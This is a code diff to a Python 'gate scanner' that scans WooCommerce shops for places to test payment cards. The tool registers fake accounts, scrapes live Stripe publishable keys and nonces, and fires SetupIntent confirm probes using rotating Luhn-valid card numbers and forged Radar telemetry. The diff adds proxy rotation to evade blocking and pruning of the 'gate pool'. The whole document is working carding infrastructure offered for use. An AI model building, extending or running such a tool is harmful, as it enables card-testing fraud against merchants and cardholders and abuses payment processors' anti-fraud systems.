@@ -22,13 +22,13 @@ def resolve_dns(host: str) -> str | None:
         return None
 
 
-async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict | None:
+async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore, proxy: str | None = None) -> dict | None:
     """Stage 1: Fast GET /my-account/ — check availability, register nonce & pk_live."""
     base = f"https://{domain}"
     url = f"{base}/my-account/"
     async with sem:
         try:
-            async with AsyncSession(impersonate="chrome131", verify=False) as s:
+            async with AsyncSession(impersonate="chrome131", verify=False, proxy=proxy) as s:
                 r = await s.get(url, timeout=8)
                 if r.status_code != 200:
                     return None
@@ -61,14 +61,14 @@ async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict
     }
 
 
-async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore) -> dict | None:
+async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore, proxy: str | None = None) -> dict | None:
     """Stage 2: Real registration POST -> check wordpress_logged_in.
        Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
        Stage 4: Live SetupIntent confirm probe (Radar Telemetry v2021 + rotating Luhn-valid probe PAN).
     """
     async with sem:
         try:
-            async with AsyncSession(impersonate="chrome131", verify=False) as s:
+            async with AsyncSession(impersonate="chrome131", verify=False, proxy=proxy) as s:
                 reg_url = f"{base}/my-account/"
 
                 # Fresh page for form inspection & nonce freshness
@@ -180,8 +180,22 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
 
 
 async def main():
+    raw_args = sys.argv[1:]
+    explicit_proxy = None
+    while "--proxy" in raw_args:
+        i = raw_args.index("--proxy")
+        if i + 1 < len(raw_args):
+            explicit_proxy = raw_args[i + 1]
+            del raw_args[i:i + 2]
+        else:
+            del raw_args[i]
+    proxy_pool = gc.load_proxies()
+    proxy_label = (f"--proxy {explicit_proxy}" if explicit_proxy
+                   else (f"{len(proxy_pool)} from data/proxies.txt" if proxy_pool else "direct (no pool)"))
+
     print("=" * 80)
     print("[*] ADVANCED GATE SCANNER v5 (curl_cffi Chrome TLS + Shared Gate Engine)")
+    print(f"[*] Proxy: {proxy_label}")
     print("=" * 80)
 
     # 1. Load candidate domains — три независимых потока добычи
@@ -235,7 +249,8 @@ async def main():
     # 3. Stage 1: Fast Surface Probing
     print(f"\n[*] Stage 1: Fast Surface Probing on {len(live_dns_domains)} domains...", flush=True)
     sem_s1 = asyncio.Semaphore(30)
-    s1_tasks = [probe_stage1_fast_surface(d, sem_s1) for d in live_dns_domains]
+    s1_tasks = [probe_stage1_fast_surface(d, sem_s1, proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
+                for d in live_dns_domains]
     s1_results = await asyncio.gather(*s1_tasks)
     s1_passed = [r for r in s1_results if r]
     print(f"[+] Stage 1 Passed: {len(s1_passed)} clean domains with open registration forms.")
@@ -244,17 +259,37 @@ async def main():
     print(f"\n[*] Stages 2-4: Deep Qualification (Session Reg -> Scrape Nonces -> Confirm Probe)...", flush=True)
     sem_deep = asyncio.Semaphore(15)
     deep_tasks = [
-        probe_stage2_3_4_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep)
+        probe_stage2_3_4_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep,
+                                       proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
         for s in s1_passed
     ]
     deep_results = await asyncio.gather(*deep_tasks)
     new_ready_gates = [r for r in deep_results if r]
 
-    # Merge newly found gates with existing ready gates (deduplicate by domain)
-    ready_dict = {g["domain"]: g for g in existing_ready}
-    for g in new_ready_gates:
-        ready_dict[g["domain"]] = g
-    final_ready_gates = list(ready_dict.values())
+    # Merge + TTL prune (Пакет 3): подтверждённые сейчас — READY, fail_count=0;
+    # неподтверждённые 24-72ч — метка STALE; старше 72ч — удаление из пула.
+    now = int(time.time())
+    STALE_AFTER = 24 * 3600
+    GATE_TTL = 72 * 3600
+    confirmed = {g["domain"]: g for g in new_ready_gates}
+    final_ready_gates = []
+    for g in existing_ready:
+        dom = g.get("domain")
+        if dom in confirmed:
+            continue  # свежее подтверждение заменит запись
+        age = now - int(g.get("updated_at", 0))
+        if age > GATE_TTL:
+            print(f"  [prune] {dom}: TTL expired ({age // 3600}h unconfirmed) — removed from pool", flush=True)
+            continue
+        if age > STALE_AFTER and g.get("status") == "READY":
+            g["status"] = "STALE"
+            print(f"  [stale] {dom}: unconfirmed {age // 3600}h — marked STALE", flush=True)
+        final_ready_gates.append(g)
+    for dom, g in confirmed.items():
+        g["updated_at"] = now
+        g["fail_count"] = 0
+        g["status"] = "READY"
+        final_ready_gates.append(g)
 
     print("\n" + "=" * 80)
     print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES IN POOL: {len(final_ready_gates)}")
@@ -268,10 +303,7 @@ async def main():
     with open(ready_file, "w", encoding="utf-8") as f:
         json.dump(final_ready_gates, f, indent=2)
 
-    active_file = os.path.join("data", "active_surfaces.json")
-    with open(active_file, "w", encoding="utf-8") as f:
-        json.dump(final_ready_gates, f, indent=2)
-    print(f"\n[+] Saved {len(final_ready_gates)} ready gates to {ready_file} and {active_file}")
+    print(f"\n[+] Saved {len(final_ready_gates)} ready gates to {ready_file}")
 
 
 if __name__ == "__main__":
